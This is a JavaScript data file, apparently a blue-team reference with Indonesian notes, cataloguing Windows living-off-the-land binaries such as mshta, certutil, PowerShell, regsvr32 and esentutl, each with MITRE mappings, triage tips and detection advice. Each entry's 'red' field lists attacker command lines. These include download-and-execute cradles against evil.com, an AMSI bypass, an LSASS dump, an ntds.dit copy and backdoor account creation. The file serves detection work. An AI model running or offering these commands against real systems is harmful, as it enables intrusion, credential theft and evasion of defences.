// ═══════════════════════════════════════════════════════════
//  yntkts — ya ndak tau kok tanya saya
//  binary intelligence database
//
//  FIELD red: { desc: "deskripsi", cmds: [{c:"command", n:"note"}] }
// ═══════════════════════════════════════════════════════════

const DB = [
  // ┌──────────────────────────────────────────────┐
  // │            WINDOWS — LOLBINS                  │
  // └──────────────────────────────────────────────┘
  { n:"mshta.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\mshta.exe",
    d:"HTML Application Host", r:"CRITICAL",
    m:["T1218.005"], mn:["Signed Binary Proxy Execution: Mshta"], t:["Defense Evasion","Execution"],
    tldr:"Binary lawas buat jalanin HTML apps — hampir zero legitimate use di enterprise modern. Kalau muncul di alert apalagi ada URL di cmdline, langsung gaspol: ini salah satu favorit attacker buat deliver payload fileless tanpa nyentuh disk sama sekali. Cek red team usage untuk pattern command-nya.",
    chain:{ stage:"Initial Access / Execution", flows:["phishing email → mshta.exe → powershell.exe → C2 beacon","ClickFix attack → mshta.exe → cmd.exe → payload.exe","mshta.exe → wscript.exe → persistence setup"] },
    abuse:"Exec arbitrary VBScript/JScript dari URL eksternal tanpa sentuh disk (fileless). ClickFix attacks, phishing payload delivery via HTA.",
    red:{
      desc:"Payload delivery via HTA, proxy execution bypass AppLocker/WDAC, fileless malware, ClickFix social engineering.",
      cmds:[
        {c:"mshta.exe http://evil.com/payload.hta", n:"load + exec HTA dari remote URL — fileless, tidak tulis disk"},
        {c:"mshta.exe C:\\Users\\Public\\payload.hta", n:"exec HTA lokal (dropped via phishing)"},
        {c:'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc BASE64"",0:close")', n:"inline VBScript untuk spawn powershell — bypass cmdline logging"},
      ]
    },
    legit:"Jarang di enterprise modern. Jika ditemukan hampir pasti suspicious.",
    tips:["Cek cmdline — ada URL eksternal (http/https)?","Cek parent — explorer.exe (user) atau proses lain?","Cek network connections post-exec — outbound ke IP mencurigakan?","Cek child process — powershell, cmd, wscript di-spawn?","Korelasi email logs — user baru buka attachment?","Cek XDR BIOC rules yang trigger bersamaan","Cek apakah ada file yang ditulis ke disk setelah eksekusi"],
    detect:"Monitor mshta.exe + cmdline http/https. Alert jika parent bukan explorer.exe. Sigma: win_susp_mshta_pattern.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Mshta/","https://attack.mitre.org/techniques/T1218/005/"] },

  { n:"certutil.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\certutil.exe",
    d:"Certificate management utility", r:"HIGH",
    m:["T1140","T1105"], mn:["Deobfuscate/Decode Files","Ingress Tool Transfer"], t:["Defense Evasion","Command and Control"],
    tldr:"Seharusnya cuma buat manage certificates, tapi flag -urlcache dan -decode bikin ini jadi wget + base64 decoder buat attacker. Kalau dua flag itu muncul di cmdline, suspicious — langsung cek destination URL dan output file-nya.",
    abuse:"Download files via -urlcache, decode base64 payloads via -decode, encode files. Alternatif wget/curl di Windows.",
    red:{
      desc:"File download -urlcache, base64 decode/encode payloads, ADS writing, hash verification post-download.",
      cmds:[
        {c:"certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\Users\\Public\\beacon.exe", n:"download file dari URL — alternatif wget/curl di Windows"},
        {c:"certutil.exe -decode encoded.b64 output.exe", n:"decode base64-encoded payload ke binary — common stager"},
        {c:"certutil.exe -encode C:\\Windows\\System32\\cmd.exe C:\\Temp\\cmd.b64", n:"encode binary ke base64 untuk exfil / bypass AV"},
        {c:"certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe", n:"download lalu langsung exec — one-liner stager"},
      ]
    },
    legit:"Certificate enrollment, CRL check. Flag -urlcache dan -decode JARANG legitimate.",
    tips:["Cek cmdline — -urlcache, -decode, -encode flags?","Cek URL tujuan download + reputasi domain/IP","Cek output file path — kemana file di-save?","Cek parent process — cmd/powershell?","Cek apakah decoded file = executable","Cek post-download execution (process chain)","Cek apakah certutil digunakan berulang (staging pattern)"],
    detect:"Alert certutil.exe + -urlcache/-decode/-encode. Sigma: win_susp_certutil_command.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Certutil/","https://attack.mitre.org/techniques/T1140/"] },

  { n:"rundll32.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\rundll32.exe",
    d:"Menjalankan fungsi dari DLL files", r:"HIGH",
    m:["T1218.011"], mn:["Signed Binary Proxy Execution: Rundll32"], t:["Defense Evasion","Execution"],
    tldr:"Load DLL functions — normal kalau DLL-nya dari System32. Yang langsung bikin alarm: ada comsvcs.dll + MiniDump di cmdline (itu LSASS dump tanpa upload tools), atau DLL dari path aneh. Kalau muncul tanpa argumen sama sekali, itu juga red flag.",
    abuse:"Load malicious DLL/fungsi, exec arbitrary code, load DLL dari network share/COM objects. Bypass whitelisting.",
    red:{
      desc:"Execute malicious DLL, bypass AppLocker, proxy execution, load shellcode, LSASS dump via comsvcs.dll.",
      cmds:[
        {c:"rundll32.exe C:\\Temp\\evil.dll,EntryPoint", n:"exec exported function dari malicious DLL"},
        {c:"rundll32.exe \\\\192.168.1.10\\share\\evil.dll,Run", n:"load DLL dari network share — DLL tidak tulis ke disk lokal"},
        {c:"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full", n:"dump LSASS memory — ganti 624 dengan PID lsass yang sebenarnya"},
        {c:"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"...\")", n:"inline JS execution bypass — jarang tapi ada di wild"},
        {c:"rundll32.exe shell32.dll,Control_RunDLL C:\\Temp\\evil.cpl", n:"load malicious CPL (Control Panel item)"},
      ]
    },
    legit:"Windows system operations. Legitimate jika DLL dari System32 + known function.",
    tips:["Cek DLL path — dari lokasi non-standard?","Cek function name — legitimate known function?","Cek parent process chain","Cek apakah DLL signed/unsigned","Cek network activity post-exec","Cek child processes","ALERT: rundll32 tanpa arguments = sangat suspicious","Cek apakah load comsvcs.dll MiniDump (credential theft)"],
    detect:"Monitor rundll32 + DLL dari temp/user/network paths. Alert tanpa arguments. Sigma: win_susp_rundll32.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Rundll32/","https://attack.mitre.org/techniques/T1218/011/"] },

  { n:"powershell.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    d:"PowerShell scripting engine", r:"CRITICAL",
    m:["T1059.001"], mn:["Command and Scripting Interpreter: PowerShell"], t:["Execution"],
    tldr:"Raja semua attacker tool di Windows. Kalau ada -enc di cmdline, itu base64 encoded command — decode itu prioritas pertama sebelum ngapa-ngapain lagi. Dari sini attacker bisa download, exec, lateral movement, persistence, semua bisa fileless. Enable Script Block Logging (Event 4104) kalau belum.",
    chain:{ stage:"Execution / C2 / Lateral Movement", flows:["mshta.exe → powershell.exe → Invoke-Mimikatz","cmd.exe → powershell.exe -enc → IEX download cradle → beacon","powershell.exe → mimikatz.exe → psexec.exe → lateral movement","Office macro → powershell.exe → schtasks.exe → persistence"] },
    abuse:"Swiss army knife attacker. Download+exec, recon, lateral movement, persistence — semua bisa fileless in-memory.",
    red:{
      desc:"Download cradle IEX/IWR, encoded commands, AMSI bypass, reflective loading, Empire/Covenant/Sliver C2.",
      cmds:[
        {c:"powershell.exe -ep bypass -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"", n:"download cradle klasik — load + exec PS1 langsung ke memori (fileless)"},
        {c:"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==", n:"-enc = base64 encoded command — HARUS di-decode saat investigasi"},
        {c:"powershell.exe -c \"IEX(IWR http://evil.com/payload.ps1 -UseBasicParsing)\"", n:"IWR (Invoke-WebRequest) cradle — varian dari DownloadString"},
        {c:"powershell.exe -ep bypass -nop -c \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('BASE64'))\"", n:"reflective .NET assembly loading — fileless, bypass AV"},
        {c:"powershell.exe -v 2 -ep bypass -nop -c \"...\"", n:"-v 2 = downgrade ke PS v2 untuk bypass ScriptBlock Logging (Event 4104)"},
        {c:"powershell.exe -c \"$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$x.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true)\"", n:"AMSI bypass pattern — disables malware scanning dalam PS session"},
      ]
    },
    legit:"Sysadmin, GPO, SCCM. Encoded commands (-enc) JARANG legitimate kecuali SCCM/Intune.",
    tips:["PRIORITY: Cek cmdline — -enc (encoded)? DECODE base64!","Cek IEX, Invoke-Expression, Invoke-WebRequest, DownloadString","Cek -ep bypass, -executionpolicy bypass","Cek parent process — siapa panggil PowerShell?","Cek Script Block Logging (Event ID 4104)","Cek version downgrade (v2) = bypass logging attempt","Cek network connections selama sesi PS","Cek AMSI bypass patterns","Cek apakah ada obfuscation (tick marks, concat, -join)"],
    detect:"Enable ScriptBlock+Module+Transcription Logging. Alert -enc, IEX, DownloadString, uncommon parent. Sigma: win_susp_powershell_*.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Powershell/","https://attack.mitre.org/techniques/T1059/001/"] },

  { n:"pwsh.exe", c:"lolbin", os:"win", p:"C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    d:"PowerShell Core 7+ (cross-platform)", r:"CRITICAL",
    m:["T1059.001"], mn:["Command and Scripting Interpreter: PowerShell"], t:["Execution"],
    tldr:"Persis sama bahayanya kayak powershell.exe tapi versi Core 7+. Bahaya tersembunyinya: banyak detection rules lupa cover pwsh.exe, jadi attacker tinggal switch ke sini untuk bypass. Pastiin rules dan SIEM lo monitor keduanya.",
    abuse:"Sama seperti powershell.exe tapi PowerShell Core. Kadang bypass rules yang hanya monitor powershell.exe.",
    red:{
      desc:"Semua teknik powershell.exe berlaku. Attacker switch ke pwsh untuk bypass detection rules lama yang hanya watch powershell.exe.",
      cmds:[
        {c:"pwsh.exe -ep bypass -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"", n:"sama dengan powershell.exe — banyak detection rules MISS pwsh.exe"},
        {c:"pwsh.exe -enc BASE64PAYLOAD", n:"encoded command — cek apakah SIEM/EDR coverage include pwsh.exe"},
        {c:"pwsh.exe -c \"Import-Module C:\\Temp\\evil.psm1; Invoke-EvilFunction\"", n:"load PowerShell module dari path non-standard"},
      ]
    },
    legit:"Modern scripting/admin. Same rules apply as powershell.exe.",
    tips:["Sama seperti powershell.exe","Cek apakah detection rules juga cover pwsh.exe (banyak yg miss)","Cek apakah installed seharusnya di endpoint ini"],
    detect:"PASTIKAN detection rules cover pwsh.exe DAN powershell.exe. Banyak org miss ini.",
    ref:["https://attack.mitre.org/techniques/T1059/001/"] },

  { n:"cmd.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\cmd.exe",
    d:"Windows Command Prompt", r:"MEDIUM",
    m:["T1059.003"], mn:["Command and Scripting Interpreter: Windows Command Shell"], t:["Execution"],
    tldr:"Sendiri sih gak terlalu alarming — ini dipakai semua orang. Fokus ke parent process-nya, bukan cmd-nya. Office app, browser, atau service yang spawn cmd? Nah itu baru merah. Cmd itu intermediary, bukan akar masalahnya.",
    abuse:"Intermediary untuk commands. Sering jadi child dari exploit/malware untuk follow-up commands.",
    red:{
      desc:"Command chaining, batch exec, intermediary shell post-exploit. Jarang digunakan langsung — biasanya dipanggil dari parent proses lain.",
      cmds:[
        {c:"cmd.exe /c \"powershell -ep bypass -enc BASE64\"", n:"Office macro / exploit spawn cmd lalu panggil PS — parent Office = red flag"},
        {c:"cmd.exe /c net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add", n:"buat akun backdoor + tambah ke admin group — one-liner"},
        {c:"cmd.exe /c \"certutil -urlcache -f http://evil.com/beacon.exe C:\\Temp\\b.exe && C:\\Temp\\b.exe\"", n:"download + exec payload dalam satu command"},
        {c:"cmd.exe /c \"whoami & ipconfig /all & net user & netstat -ano > C:\\Temp\\recon.txt\"", n:"rapid recon dump ke file — common post-exploit pattern"},
      ]
    },
    legit:"Widely used admin. Fokus pada PARENT PROCESS.",
    tips:["Cek parent — dari Office app (Word/Excel)? = SANGAT suspicious","Cek cmdline arguments","Cek child processes","Cek redirection (> >>) ke file","Cek pipes (|) ke program lain","Cek /c flag — apa command-nya?"],
    detect:"Alert cmd.exe spawn dari Office/browser/uncommon parent. Monitor cmdline content.",
    ref:["https://attack.mitre.org/techniques/T1059/003/"] },

  { n:"wscript.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\wscript.exe",
    d:"Windows Script Host (GUI)", r:"HIGH",
    m:["T1059.005"], mn:["Command and Scripting Interpreter: Visual Basic"], t:["Execution"],
    tldr:"Jalanin VBScript/JScript — legitimate di GPO/login scripts, tapi hampir gak ada alasan user biasa pakai ini. Script dari temp/downloads atau parent email client = langsung flag. Di modern enterprise, kalau ragu anggap suspicious.",
    abuse:"Run malicious VBS/JS untuk download payloads, persistence, exec arbitrary code. Phishing attachments.",
    red:{
      desc:"Script-based payload exec, dropper scripts, persistence via scheduled tasks, .vbs/.js/.wsf payloads dari phishing.",
      cmds:[
        {c:"wscript.exe C:\\Users\\Public\\dropper.vbs", n:"exec VBScript — biasanya dari phishing attachment atau download"},
        {c:"wscript.exe C:\\Temp\\payload.js", n:"exec JScript — bisa download+exec payload lain"},
        {c:"wscript.exe //B //NoLogo C:\\Temp\\silent.vbs", n:"//B = batch mode (suppress dialogs), //NoLogo = stealth execution"},
        {c:"wscript.exe C:\\Temp\\payload.wsf", n:"WSF = bisa combine VBS+JS dalam satu file, lebih flexible untuk attacker"},
      ]
    },
    legit:"Login scripts, GPO. Di luar itu JARANG legitimate di modern env.",
    tips:["Cek script file — lokasi + konten","Cek parent — email client/explorer?","Cek network connections dari script","Cek child processes (cmd, powershell)","Cek file writes post-exec","Cek registry changes (persistence)"],
    detect:"Monitor wscript.exe dari temp/downloads. Alert network activity.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Wscript/","https://attack.mitre.org/techniques/T1059/005/"] },

  { n:"cscript.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\cscript.exe",
    d:"Windows Script Host (Console)", r:"HIGH",
    m:["T1059.005"], mn:["Command and Scripting Interpreter: Visual Basic"], t:["Execution"],
    tldr:"Versi silent dari wscript — sama bahayanya, bedanya gak ada GUI popup jadi lebih stealthy. //B flag = sengaja suppress error output. Treat sama persis seperti wscript.exe.",
    abuse:"Console version wscript. Run malicious scripts tanpa GUI window — more stealthy.",
    red:{
      desc:"Silent headless script execution — lebih stealthy dari wscript karena no GUI window.",
      cmds:[
        {c:"cscript.exe //B //NoLogo C:\\Temp\\payload.vbs", n:"//B = suppress errors, //NoLogo = no banner — full silent exec"},
        {c:"cscript.exe //B C:\\Temp\\enum.js", n:"JScript recon script — bisa query WMI, net, registry"},
        {c:"cscript.exe //E:jscript C:\\Temp\\noextension", n:"//E override extension — exec file tanpa .js extension"},
      ]
    },
    legit:"Login/admin scripts. Sama seperti wscript — jarang legitimate di user context.",
    tips:["Sama seperti wscript.exe","Cek /B flag (batch/suppress errors)","Cek output redirection"],
    detect:"Monitor cscript.exe dari unexpected locations. Alert scripts dari temp/downloads.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Cscript/"] },

  { n:"regsvr32.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\regsvr32.exe",
    d:"Register OLE controls / COM DLLs", r:"HIGH",
    m:["T1218.010"], mn:["Signed Binary Proxy Execution: Regsvr32"], t:["Defense Evasion","Execution"],
    tldr:"Register COM DLLs — tapi kalau ada /i: + URL di cmdline, itu Squiblydoo attack, salah satu bypass AppLocker paling classic. /i: dengan URL = NEVER legitimate, langsung alert, gak perlu context tambahan.",
    abuse:"Squiblydoo attack — load scriptlet (.sct) dari URL remote. Bypass AppLocker.",
    red:{
      desc:"Squiblydoo bypass AppLocker/WDAC, load remote SCT scriptlet, DLL side-loading.",
      cmds:[
        {c:"regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll", n:"Squiblydoo — load+exec SCT scriptlet dari URL, bypass AppLocker. /s=silent, /n=no DllInstall, /u=unregister trigger /i:"},
        {c:"regsvr32.exe /s /n /u /i:file://C:\\Temp\\payload.sct scrobj.dll", n:"Squiblydoo dari file lokal (dropped dulu via phishing)"},
        {c:"regsvr32.exe /s C:\\Temp\\evil.dll", n:"register malicious DLL — DllRegisterServer function akan dieksekusi"},
      ]
    },
    legit:"Software install/registration. /i: dengan URL = NEVER legitimate.",
    tips:["Cek cmdline — /i: flag + URL?","Cek scrobj.dll usage (scriptlet exec)","Cek DLL path — non-standard?","Cek network connections ke external URLs","Cek parent process + user context","Cek child processes post-DLL registration"],
    detect:"Alert regsvr32.exe + /i: + URL. Monitor scrobj.dll usage.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/","https://attack.mitre.org/techniques/T1218/010/"] },

  { n:"msiexec.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\msiexec.exe",
    d:"Windows Installer", r:"HIGH",
    m:["T1218.007"], mn:["Signed Binary Proxy Execution: Msiexec"], t:["Defense Evasion","Execution"],
    tldr:"Windows Installer yang bisa install langsung dari URL — dan MSI package bisa contain payload apapun. /q + URL external = silent install malicious package. SCCM mungkin bikin pattern serupa, tapi manual user invocation dengan URL = investigate.",
    abuse:"Install malicious MSI dari URL remote. MSI contain embedded DLLs/scripts/exes. Bypass whitelisting.",
    red:{
      desc:"Remote MSI install dari URL, DLL exec via /y flag, silent install malicious packages.",
      cmds:[
        {c:"msiexec.exe /q /i http://evil.com/payload.msi", n:"/q=quiet/silent, /i=install dari URL — MSI bisa contain EXE/DLL/scripts"},
        {c:"msiexec.exe /q /i \\\\192.168.1.10\\share\\payload.msi", n:"install dari network share — lateral movement / deployment"},
        {c:"msiexec.exe /y C:\\Temp\\evil.dll", n:"/y = call DllUnregisterServer — exec DLL code tanpa rundll32"},
        {c:"msiexec.exe /z C:\\Temp\\evil.dll", n:"/z = call DllInstall dengan argument — alternative DLL exec"},
      ]
    },
    legit:"SCCM/GPO deployment. Manual install dari URL = JARANG legitimate.",
    tips:["Cek cmdline — URL untuk remote MSI?","Cek /q /qn flags — silent install?","Cek MSI source — temp/downloads/network?","Cek Windows Installer logs","Cek child processes post-install","Cek file system changes"],
    detect:"Alert msiexec.exe + URL atau MSI dari non-standard paths. Monitor silent installs.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Msiexec/","https://attack.mitre.org/techniques/T1218/007/"] },

  { n:"bitsadmin.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\bitsadmin.exe",
    d:"BITS admin tool", r:"HIGH",
    m:["T1197","T1105"], mn:["BITS Jobs","Ingress Tool Transfer"], t:["Defense Evasion","Persistence","Command and Control"],
    tldr:"Download via BITS service — traffic-nya nyamar jadi Windows Update, dan download job persist across reboot. Manual invocation dengan /transfer ke URL external = suspicious. Cek juga SetNotifyCmdLine yang bisa auto-exec payload setelah download selesai.",
    abuse:"Stealth download via BITS service. Persistent download jobs survive reboot.",
    red:{
      desc:"Stealth download pakai BITS service — traffic camouflage sebagai Windows Update, job persist across reboot.",
      cmds:[
        {c:"bitsadmin.exe /transfer evilJob /download /priority high http://evil.com/beacon.exe C:\\Temp\\beacon.exe", n:"one-liner download — BITS traffic blend in dengan Windows Update traffic"},
        {c:"bitsadmin.exe /create evilJob && bitsadmin.exe /addfile evilJob http://evil.com/b.exe C:\\Temp\\b.exe && bitsadmin.exe /resume evilJob", n:"create job step by step — job persist di registry sampai complete"},
        {c:"bitsadmin.exe /create evilJob && bitsadmin.exe /addfile evilJob http://evil.com/b.exe C:\\Temp\\b.exe && bitsadmin.exe /SetNotifyCmdLine evilJob C:\\Temp\\b.exe NULL && bitsadmin.exe /resume evilJob", n:"SetNotifyCmdLine = exec payload otomatis setelah download selesai"},
      ]
    },
    legit:"Windows Update, SCCM. Manual invocation oleh user = JARANG legitimate.",
    tips:["Cek cmdline — /transfer, /create, /addfile, /resume?","Cek URL tujuan download","Cek output file path","Cek persistent BITS jobs (bitsadmin /list /allusers)","Cek post-download execution","Cek parent process"],
    detect:"Alert bitsadmin.exe + /transfer. Monitor BITS jobs download external URLs.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/","https://attack.mitre.org/techniques/T1197/"] },

  { n:"cmstp.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\cmstp.exe",
    d:"Connection Manager Profile Installer", r:"HIGH",
    m:["T1218.003"], mn:["Signed Binary Proxy Execution: CMSTP"], t:["Defense Evasion","Execution"],
    tldr:"VPN profile installer yang hampir gak pernah ada di workflow enterprise modern. Kalau ini muncul di alert, hampir pasti suspicious — bisa bypass UAC dan AppLocker via malicious INF file.",
    abuse:"Exec arbitrary commands via malicious .inf files. Bypass UAC + AppLocker.",
    red:{
      desc:"UAC bypass dan AppLocker bypass via malicious INF file yang punya RunPreSetupCommands section.",
      cmds:[
        {c:"cmstp.exe /s C:\\Temp\\evil.inf", n:"/s = silent install INF — INF berisi RunPreSetupCommands yang exec payload"},
        {c:"cmstp.exe /s /ns C:\\Temp\\uac_bypass.inf", n:"/ns = no setup = skip setup, langsung ke RunPreSetupCommands — UAC bypass"},
      ]
    },
    legit:"VPN profile install. Sangat jarang — hampir selalu suspicious.",
    tips:["Cek INF file — konten + lokasi","Cek /s (silent) flag","Cek INF RunPreSetupCommands / RegisterOCXs","Cek parent + user context","Cek child processes post-exec"],
    detect:"Alert ANY cmstp.exe execution (sangat jarang legitimate).",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Cmstp/","https://attack.mitre.org/techniques/T1218/003/"] },

  { n:"msbuild.exe", c:"lolbin", os:"win", p:"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
    d:"Microsoft Build Engine", r:"HIGH",
    m:["T1127.001"], mn:["Trusted Developer Utilities: MSBuild"], t:["Defense Evasion","Execution"],
    tldr:"Build engine yang bisa exec inline C# dari XML tanpa nulis .exe ke disk. Di non-developer endpoint gak ada alasannya jalan — investigate. Di developer machine butuh lebih banyak context, tapi project file dari temp/downloads tetap suspicious.",
    abuse:"Execute inline C# dari .csproj/.xml tanpa compile ke disk. Bypass AppLocker.",
    red:{
      desc:"Exec inline C# payload dari XML project file — fileless, signed Microsoft binary, bypass AppLocker.",
      cmds:[
        {c:"msbuild.exe C:\\Temp\\payload.csproj", n:"exec .csproj yang punya inline <UsingTask> C# code — compile + run in memory"},
        {c:"msbuild.exe \\\\evil.com\\share\\payload.xml", n:"load project file dari remote UNC path — fileless dari network"},
        {c:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Temp\\shell.xml", n:"64-bit variant — sama fungsinya, pastikan coverage kedua path"},
      ]
    },
    legit:"Software dev/CI. Di non-developer endpoint = suspicious.",
    tips:["Cek project file — .csproj/.xml?","Cek inline tasks (UsingTask) dalam project file","Cek lokasi project file — temp/downloads?","Cek parent — dev tools atau suspicious?","Cek child processes + network connections"],
    detect:"Alert msbuild.exe di non-developer endpoints. Monitor project files dari unusual locations.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Msbuild/","https://attack.mitre.org/techniques/T1127/001/"] },

  { n:"installutil.exe", c:"lolbin", os:"win", p:"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
    d:".NET installation utility", r:"HIGH",
    m:["T1218.004"], mn:["Signed Binary Proxy Execution: InstallUtil"], t:["Defense Evasion","Execution"],
    tldr:".NET installer yang bisa exec arbitrary code via custom class. /U flag + assembly dari path non-standard = red flag. Di luar software deployment context harusnya gak running.",
    abuse:"Execute arbitrary .NET code via custom installer classes. Bypass whitelisting (signed MS).",
    red:{
      desc:"Exec .NET payload via custom Installer class, bypass AppLocker/WDAC. /U flag trigger Uninstall() method yang berisi shellcode.",
      cmds:[
        {c:"installutil.exe /logfile= /logtoconsole=false /U C:\\Temp\\payload.dll", n:"/U = trigger Uninstall() — custom .NET class berisi shellcode loader"},
        {c:"installutil.exe /logfile= /logtoconsole=false C:\\Temp\\payload.exe", n:"tanpa /U — trigger Install() method"},
        {c:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /U C:\\Temp\\payload.dll", n:"64-bit variant — coverage kedua path"},
      ]
    },
    legit:"Software deployment. Di luar deployment context = suspicious.",
    tips:["Cek assembly — dari mana, apa isinya?","Cek /U flag — trigger Uninstall() method","Cek assembly signed/unsigned","Cek child procs + network connections"],
    detect:"Alert installutil.exe di luar software deployment context. Monitor /U flag.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Installutil/","https://attack.mitre.org/techniques/T1218/004/"] },

  { n:"wmic.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\wbem\\wmic.exe",
    d:"WMI Command-line (DEPRECATED Win11)", r:"HIGH",
    m:["T1047"], mn:["Windows Management Instrumentation"], t:["Execution"],
    tldr:"WMI CLI yang bisa remote exec — \"process call create\" itu spawn proses baru, bisa ke remote host pakai /node: flag. Udah DEPRECATED di Win11 jadi makin susah justify legitimate use-nya. Remote exec ke host lain = lateral movement.",
    abuse:"Remote command exec, process creation, system enum. Lateral movement + recon.",
    red:{
      desc:"Remote process creation via WMI, lateral movement, recon, WMI event subscription untuk persistence.",
      cmds:[
        {c:"wmic.exe process call create \"powershell -ep bypass -enc BASE64\"", n:"spawn process baru via WMI — bypass beberapa detection yang monitor CreateProcess"},
        {c:"wmic.exe /node:192.168.1.10 /user:DOMAIN\\admin /password:Pass123 process call create \"cmd /c whoami > C:\\Temp\\out.txt\"", n:"remote WMI exec — lateral movement ke host lain"},
        {c:"wmic.exe /node:192.168.1.10 process list brief", n:"enum proses di remote host — recon tanpa RDP"},
        {c:"wmic.exe os get Caption,Version,OSArchitecture,LastBootUpTime", n:"OS fingerprint + patch level recon — sering di awal post-exploit"},
      ]
    },
    legit:"Sysadmin. DEPRECATED di Win11 — any usage increasingly suspicious.",
    tips:["Cek cmdline — process call create? Apa di-create?","Cek /node: flag — remote system?","Cek WMI event subscription creation (persistence)","Cek parent process","Cek recon queries (os get, computersystem)"],
    detect:"Alert wmic process call create. Monitor /node: for remote exec. Alert WMI event subs.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Wmic/","https://attack.mitre.org/techniques/T1047/"] },

  { n:"forfiles.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\forfiles.exe",
    d:"Batch processing on selected files", r:"MEDIUM",
    m:["T1202"], mn:["Indirect Command Execution"], t:["Defense Evasion"],
    tldr:"Indirect exec — dipakai untuk spawn cmd/powershell dengan parent yang beda, bypass detection rules yang fokus ke direct spawning. Gak terlalu common di wild, tapi ada di toolkit. /c flag yang jalanin executable = yang perlu dilihat.",
    abuse:"Indirect command exec — run commands tanpa langsung panggil cmd.exe. Bypass cmdline logging.",
    red:{
      desc:"Indirect exec untuk bypass detection rules yang monitor cmd.exe/powershell.exe secara langsung.",
      cmds:[
        {c:"forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c powershell -ep bypass -enc BASE64\"", n:"exec powershell lewat forfiles — indirect execution, parent bukan cmd langsung"},
        {c:"forfiles.exe /p C:\\Windows\\System32 /m calc.exe /c \"cmd /c C:\\Temp\\beacon.exe\"", n:"exec payload dengan forfiles sebagai parent — bypass rules yang monitor direct cmd spawn"},
      ]
    },
    legit:"File management scripts. Exec cmd/powershell via /c = suspicious.",
    tips:["Cek /c parameter — command apa?","Cek /p (path) + /m (mask)","Cek parent process","Cek apakah avoid cmd.exe logging"],
    detect:"Monitor forfiles.exe + /c running executables.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Forfiles/"] },

  { n:"esentutl.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\esentutl.exe",
    d:"Extensible Storage Engine utility", r:"HIGH",
    m:["T1003.003","T1105"], mn:["OS Credential Dumping: NTDS","Ingress Tool Transfer"], t:["Credential Access","Command and Control"],
    tldr:"Bisa copy locked database files. Satu hal yang langsung bikin incident: kalau source file-nya ntds.dit atau SAM — itu attacker mau extract semua AD hashes. Cek source path-nya, itu yang paling penting.",
    abuse:"Copy locked files (ntds.dit, SAM), download files via URL, write ADS.",
    red:{
      desc:"Copy locked database files (ntds.dit, SAM, SYSTEM hive) yang tidak bisa di-copy dengan cara biasa.",
      cmds:[
        {c:"esentutl.exe /y C:\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit /o", n:"copy ntds.dit (AD database) — /y=copy, /o=overwrite. Butuh shadow copy biasanya"},
        {c:"esentutl.exe /y \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit /o", n:"copy ntds.dit dari VSS shadow copy — bypass file lock"},
        {c:"esentutl.exe /y http://evil.com/beacon.exe /d C:\\Temp\\beacon.exe /o", n:"download file dari URL — alternatif certutil/bitsadmin"},
      ]
    },
    legit:"DB maintenance Exchange/AD. Copy ntds.dit = SANGAT suspicious.",
    tips:["Cek command — /y (copy), /p, /d?","Cek source file — ntds.dit? SAM? SYSTEM?","Cek URL parameter","Cek destination path","Cek user context — domain admin?"],
